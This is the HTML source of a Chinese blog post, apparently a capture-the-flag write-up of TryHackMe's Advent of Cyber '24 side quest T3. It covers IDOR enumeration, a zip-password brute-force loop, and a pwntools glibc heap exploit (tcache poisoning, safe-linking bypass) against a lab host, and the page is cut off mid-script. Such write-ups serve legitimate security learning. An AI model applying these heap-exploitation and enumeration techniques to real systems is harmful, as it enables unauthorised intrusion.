@@ -1,0 +1,816 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+<meta name="google-site-verification" content="LZ0JOjQQZw7PhvjIbZqeOojf3J6807W7DPn6--OTptc" />
+<meta name="baidu-site-verification" content="code-DDmcbQ6zQN" />
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <meta name="google-site-verification" content="true">
+  <meta name="msvalidate.01" content="true">
+  <meta name="yandex-verification" content="true">
+  <meta name="baidu-site-verification" content="true">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"noone40404.github.io","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":true},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":5,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="最难的re部分跳过了QAQ">
+<meta property="og:type" content="article">
+<meta property="og:title" content="THM打靶日寄62-Advent of Cyber &#39;24：支线T3丑陋复现">
+<meta property="og:url" content="http://noone40404.github.io/2025/01/25/THM%E6%89%93%E9%9D%B6%E6%97%A5%E5%AF%8462%EF%BC%9AAdvent%20of%20Cyber%20'24%20Side%20QuestT3/index.html">
+<meta property="og:site_name" content="noone___&#39;s blog">
+<meta property="og:description" content="最难的re部分跳过了QAQ">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67944b02d0e0a243d4f7b27b.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67945348d0e0a243d4f7b381.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67945418d0e0a243d4f7b3bf.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/6794547ad0e0a243d4f7b3cb.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/679454b9d0e0a243d4f7b3d2.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/6794555cd0e0a243d4f7b3e4.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67945690d0e0a243d4f7b418.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67945890d0e0a243d4f7b463.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67945913d0e0a243d4f7b46e.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67945a40d0e0a243d4f7b4a1.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/6794a4dfd0e0a243d4f7cc66.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/6794a54bd0e0a243d4f7cca2.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/6794a945d0e0a243d4f7ce9b.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/6794abe1d0e0a243d4f7d044.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/6794ac07d0e0a243d4f7d050.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/6794ad8cd0e0a243d4f7d0e5.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/6794b156d0e0a243d4f7d27a.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/6794b1a2d0e0a243d4f7d2a3.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/6794b307d0e0a243d4f7d36d.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/6794b345d0e0a243d4f7d38c.png">
+<meta property="article:published_time" content="2025-01-25T00:26:00.000Z">
+<meta property="article:modified_time" content="2025-01-25T09:48:17.457Z">
+<meta property="article:author" content="noone___">
+<meta property="article:tag" content="THM">
+<meta property="article:tag" content="Advent of Cyber 2024">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic1.imgdb.cn/item/67944b02d0e0a243d4f7b27b.png">
+
+<link rel="canonical" href="http://noone40404.github.io/2025/01/25/THM%E6%89%93%E9%9D%B6%E6%97%A5%E5%AF%8462%EF%BC%9AAdvent%20of%20Cyber%20'24%20Side%20QuestT3/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>THM打靶日寄62-Advent of Cyber '24：支线T3丑陋复现 | noone___'s blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="noone___'s blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">noone___'s blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-sitemap">
+
+    <a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <a href="https://github.com/noone40404" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://noone40404.github.io/2025/01/25/THM%E6%89%93%E9%9D%B6%E6%97%A5%E5%AF%8462%EF%BC%9AAdvent%20of%20Cyber%20'24%20Side%20QuestT3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="noone___">
+      <meta itemprop="description" content="自闭中">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="noone___'s blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          THM打靶日寄62-Advent of Cyber '24：支线T3丑陋复现
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2025-01-25 08:26:00 / 修改时间：17:48:17" itemprop="dateCreated datePublished" datetime="2025-01-25T08:26:00+08:00">2025-01-25</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">渗透</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+            <div class="post-description">最难的re部分跳过了QAQ</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <ul>
+<li><p><code>keycard</code></p>
+<p>  位于 <code>day12</code> ，从这句话暗示出在找 <code>IDOR</code> 越权漏洞：</p>
+<p>  <img src="https://pic1.imgdb.cn/item/67944b02d0e0a243d4f7b27b.png" alt=""></p>
+<p>  <img src="https://pic1.imgdb.cn/item/67945348d0e0a243d4f7b381.png" alt=""></p>
+<p>  用大字典扫多出一个 <code>transactions</code></p>
+<p>  看到需要 <code>id</code> 值</p>
+<p>  <img src="https://pic1.imgdb.cn/item/67945418d0e0a243d4f7b3bf.png" alt=""></p>
+<p>  而正常交易后会给我们一个交易id，填进去</p>
+<p>  <img src="https://pic1.imgdb.cn/item/6794547ad0e0a243d4f7b3cb.png" alt=""></p>
+<p>  而这串值是32位 <code>md5</code>：</p>
+<p>  <img src="https://pic1.imgdb.cn/item/679454b9d0e0a243d4f7b3d2.png" alt=""></p>
+<p>  那么可以通过手动加密来遍历所有交易的情况，wp这里限制在 <code>1330-1350</code> 的范围</p>
+<p>  <img src="https://pic1.imgdb.cn/item/6794555cd0e0a243d4f7b3e4.png" alt=""></p>
+<p>  然后attackbox的社区版不支持这么攻击，偷张图</p>
+<p>  <img src="https://pic1.imgdb.cn/item/67945690d0e0a243d4f7b418.png" alt=""></p>
+<p>  特殊长度的响应包里面返回值解码是 <code>keycard</code> 的地址：</p>
+<p>  <img src="https://pic1.imgdb.cn/item/67945890d0e0a243d4f7b463.png" alt=""></p>
+<p>  <code>/secret/0opsIDidItAgain_MayorMalware1337.png</code></p>
+<p>  <img src="https://pic1.imgdb.cn/item/67945913d0e0a243d4f7b46e.png" alt=""></p>
+<p>  <code>BlizzardB3arM4sterCrack3rFTW</code></p>
+</li>
+<li><p>逃离暴风雪</p>
+<p>  继续 <code>21337</code> 关防火墙</p>
+<p>  <img src="https://pic1.imgdb.cn/item/67945a40d0e0a243d4f7b4a1.png" alt=""></p>
+<p>  能扫出来 <code>backup</code></p>
+<p>  <img src="https://pic1.imgdb.cn/item/6794a4dfd0e0a243d4f7cc66.png" alt=""></p>
+<p>  都存下来，然后尝试连接 <code>1337</code></p>
+<p>  <img src="https://pic1.imgdb.cn/item/6794a54bd0e0a243d4f7cca2.png" alt=""></p>
+<ul>
+<li><p><code>zip</code> 解压</p>
+<p>  <code>enc</code> 文件可以将字符串加密，而 <code>zip</code> 文件的密码并非是密码本中的</p>
+<p>  那么自然用 <code>enc</code> 文件重新加密密码本再尝试解压：</p>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> IFS= <span class="built_in">read</span> -r line; <span class="keyword">do</span></span><br><span class="line"><span class="keyword">if</span> 7z x -y -p$(./enc <span class="variable">$line</span>) ./secure-storage.zip; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;found: <span class="variable">$line</span>&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 0</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;test: <span class="variable">$line</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+<p>  得到密码 <code>30510d980c6bd5b3898dd0836426807b</code></p>
+</li>
+<li><p>堆的 <code>pwn</code></p>
+<p>  真不会吧，开摆，<a target="_blank" rel="noopener" href="https://0xb0b.gitbook.io/writeups/tryhackme/2024/advent-of-cyber-24-side-quest/t3-escaping-the-blizzard#teardown-firewall">参考文献1</a>，<a target="_blank" rel="noopener" href="https://github.com/ChrisPritchard/ctf-writeups/blob/master/tryhackme-rooms/adventofcyber24sidequest.md#sq3-escaping-the-blizzard">参考文献2</a></p>
+  <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">binary = <span class="string">&#x27;./secureStorage&#x27;</span></span><br><span class="line">elf = ELF(binary)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;10.10.245.156&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line"><span class="comment"># p = process(binary)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">index,size,data</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;&gt;&gt;&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index:&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;size:&#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;data:&#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,data</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;&gt;&gt;&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index:&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;data:&#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;&gt;&gt;&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index:&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvline();</span><br><span class="line">    <span class="keyword">return</span> p.recvline().strip()</span><br><span class="line"></span><br><span class="line"><span class="comment"># first need a libc and heap base leak</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">0</span>, <span class="number">256</span>, <span class="number">256</span>*<span class="string">b&quot;A&quot;</span> + p64(<span class="number">0</span>) + p64(<span class="number">0xc61</span>)) <span class="comment"># create an overflow top chunk size, &#x27;house of orange&#x27; style</span></span><br><span class="line">create(<span class="number">1</span>, <span class="number">0xf98</span>, <span class="string">b&quot;firstlargechunk&quot;</span>) <span class="comment"># this will be used later, but here forces top chunk into unsorted bin</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># original top is now in unsorted bins because its size is too big for tcache bins</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak a libc address, by carving a portion from our unsorted bin </span></span><br><span class="line"><span class="comment"># which has a libc address in it at 8: and which gets preserved in the new alloc</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">2</span>, <span class="number">24</span>, <span class="string">b&quot;LEAKADDD&quot;</span>)</span><br><span class="line">data = show(<span class="number">2</span>)</span><br><span class="line">data = u64(data[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;leaked libc: &#x27;</span> + <span class="built_in">hex</span>(data))</span><br><span class="line">libc_base = data - <span class="number">0x204120</span> <span class="comment"># calculated using vmmap and comparing libc base the above</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc\&#x27;s base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">libc.address = libc_base</span><br><span class="line"></span><br><span class="line"><span class="comment"># do the same again, this time for a heap address at position 16:</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>, <span class="string">b&quot;LEAKADDDLEAKADDD&quot;</span>)</span><br><span class="line">data = show(<span class="number">2</span>)</span><br><span class="line">data = u64(data[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;leaked heap: &#x27;</span> + <span class="built_in">hex</span>(data))</span><br><span class="line">heap_base = data - <span class="number">0x3a0</span> <span class="comment"># calculated using vmmap and comparing to the above</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;heap\&#x27;s base: &#x27;</span> + <span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># now need to return to our second alloc (first big one) to overflow the new top</span></span><br><span class="line"><span class="comment"># need to overflow the top size to 0x60 (61 with in use bit) so it goes into a specific tcache bin</span></span><br><span class="line"><span class="comment"># under 0x410 means tcache, not unsorted. this is the &#x27;house of tangerine&#x27; attack</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span>*<span class="number">0xf98</span></span><br><span class="line">payload += p64(<span class="number">0x61</span>) <span class="comment"># target bin we want to hit, here 0x40 + 0x20</span></span><br><span class="line">edit(<span class="number">1</span>, payload)</span><br><span class="line">create(<span class="number">3</span>, <span class="number">0xf98</span>, <span class="string">b&quot;secondlargechunk&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># top chunk will now be in tcache 0x40 (this is the second top chunk, after the original we used for leaks)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;secondlargechunk&quot;</span></span><br><span class="line">payload += <span class="string">b&quot;B&quot;</span>*(<span class="number">0xf98</span> - <span class="built_in">len</span>(payload))</span><br><span class="line">payload += p64(<span class="number">0x61</span>)</span><br><span class="line">edit(<span class="number">3</span>, payload)</span><br><span class="line">create(<span class="number">4</span>, <span class="number">0x1000</span>, <span class="string">b&quot;thirdlargechunk&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># new top chunk will be in tcache 0x40, linked to the first one</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># need to calculate the corrupted tcache address (which is xor encoded with portions of its memory address)</span></span><br><span class="line"><span class="comment"># which will be our target; when we allocate off the tcache list, malloc will return this target address</span></span><br><span class="line"></span><br><span class="line">vuln_tcache = heap_base + <span class="number">0x43FB0</span> <span class="comment"># this is the first address after the size of the first tcache chunk, overwritable with index 2</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;tcache address: &quot;</span> + <span class="built_in">hex</span>(vuln_tcache))</span><br><span class="line">target = libc.symbols[<span class="string">&quot;__libc_argv&quot;</span>] - <span class="number">0x10</span> <span class="comment"># this contains an address on the stack, which can leak to use for further targeting. go back 0x10 so as not to wipe the data we want to read</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;target address: &quot;</span> + <span class="built_in">hex</span>(target))</span><br><span class="line">safe_link_addr = target ^ (vuln_tcache &gt;&gt; <span class="number">12</span>) <span class="comment"># not-so-safe linking protection bypass</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span>*<span class="number">0xf98</span></span><br><span class="line">payload += p64(<span class="number">0x41</span>) <span class="comment"># note once the bins are in the tcache, they are 0x20 smaller than they were before</span></span><br><span class="line">payload += p64(safe_link_addr)</span><br><span class="line">edit(<span class="number">3</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># allocate out of the tcache bin, corruptng it</span></span><br><span class="line">create(<span class="number">5</span>, <span class="number">0x30</span>, <span class="string">b&quot;removefirsttcache&quot;</span>)</span><br><span class="line">create(<span class="number">6</span>, <span class="number">0x30</span>, <span class="string">b&quot;controllocation!&quot;</span>) <span class="comment"># this &#x27;permit&#x27; will be allocated at the address we specified above</span></span><br><span class="line"></span><br><span class="line">data = show(<span class="number">6</span>)</span><br><span class="line">data = u64(data[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;leaked stack: &#x27;</span> + <span class="built_in">hex</span>(data))</span><br><span class="line">predicted_main_ret = data - <span class="number">0x120</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;main ret: &#x27;</span> + <span class="built_in">hex</span>(predicted_main_ret))</span><br><span class="line"></span><br><span class="line">create(<span class="number">7</span>, <span class="number">0xc10</span>, <span class="string">b&quot;fourthlargechunk&quot;</span>) <span class="comment"># just to clean out the unsorted bin - this is the size of the bin - 0x10, and results in the bin being fully allocated back on the heap</span></span><br><span class="line"><span class="comment"># we do this because its size is bigger than the tcache bins we want to create next, which will likely mean any allocations would have gotten carved out of this bin instead</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># first of the new tcache bins - still in the heap at this point</span></span><br><span class="line">create(<span class="number">8</span>, <span class="number">0xbc8</span>, <span class="string">b&quot;fifthlargechunk&quot;</span>)</span><br><span class="line">payload = <span class="string">b&quot;fifthlargechunk&quot;</span></span><br><span class="line">payload += <span class="string">b&quot;C&quot;</span>*(<span class="number">0xbc8</span> - <span class="built_in">len</span>(payload))</span><br><span class="line">payload += p64(<span class="number">0x421</span>) <span class="comment"># size of the bin we are targeting, 0x400 + 0x20</span></span><br><span class="line">edit(<span class="number">8</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># second new bin, and also it pushes the previous into the tcache</span></span><br><span class="line">create(<span class="number">9</span>, <span class="number">0xbd8</span>, <span class="string">b&quot;sixthlargechunk&quot;</span>)</span><br><span class="line">payload = <span class="string">b&quot;sixthlargechunk&quot;</span></span><br><span class="line">payload += <span class="string">b&quot;D&quot;</span>*(<span class="number">0xbd8</span> - <span class="built_in">len</span>(payload))</span><br><span class="line">payload += p64(<span class="number">0x421</span>)</span><br><span class="line">edit(<span class="number">9</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># this will push the second bin into the tcache bin 0x400, with the two linked</span></span><br><span class="line">create(<span class="number">10</span>, <span class="number">0x1000</span>, <span class="string">b&quot;seventhlargechunk&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># targeting for our second arbitrary allow - the offset is calculated by the head of the tcache bin - heap base</span></span><br><span class="line">vuln_tcache = heap_base + <span class="number">0x87BF0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;new vuln tcache: &quot;</span> + <span 